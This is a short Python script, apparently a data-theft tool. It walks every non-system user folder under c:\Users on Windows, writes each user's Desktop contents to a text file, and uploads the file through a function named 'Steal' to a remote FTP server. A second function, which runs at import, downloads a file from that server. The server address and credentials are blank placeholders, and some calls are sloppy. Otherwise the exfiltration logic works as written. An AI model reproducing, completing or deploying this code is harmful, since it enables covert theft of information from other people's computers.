import ftplib
import os


def Steal(filename):
    ip = ''
    port = 1234
    username = ''
    password = ''
    
    ftp = ftplib.FTP()
    ftp.connect(ip,port)
    ftp.login(username,password)
    
    localpath = os.getcwd()
    mypath = '/z4'
    
    ftp.cwd(mypath) #change working directory
    
    files = ftp.nlst()
    print('BEFORE: ',files)
    
    filepath = os.path.join(localpath,filename)
    fileupload = open(filepath, 'rb')
    
    result = ftp.storbinary('STOR ' + filename, fileupload)
    print(result)
    
    files = ftp.nlst()
    print('AFTER: ', files)
    ftp.close()




def ScanDesktop(path='Desktop',upload=False):
    folder_start = r'c:\Users'    
    system_folder = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'User', 'win10']
    
    users_folder = os.listdir(folder_start)
    for u in users_folder:
        if u not in system_folder:
            try:
                 userpath = os.path.join(folder_start,u)
                 desktop = os.path.join(userpath,path)
                 print(os.listdir(desktop))
                 desktop_list = os.listdir(desktop)
                 print('Desktop: ',desktop)
                 for d in desktop_list:
                    folder = os.path.join(desktop,d)
                    filename = 'desktop-{}.txt'.format(u.replace(' ','-'))
                    with open(filename,'a',encoding='utf-8') as file:
                        t = '{}\n'.format(folder)
                        file.write(t)
                 Steal(filename)
            except:
                pass
            

def Download():
    ip = ''
    port = 1234
    username = ''
    password = ''
    
    ftp = ftplib.FTP()
    ftp.connect(ip,port)
    ftp.login(username,password)
    
    localpath = os.getcwd()
    mypath = ''
    
    ftp.cwd(mypath) #change working directory
    
    with open('.txt','wb') as fp:
        ftp.retrbinary('.txt', fp.write)
    ftp.close()
    
Download()
            
            
            
            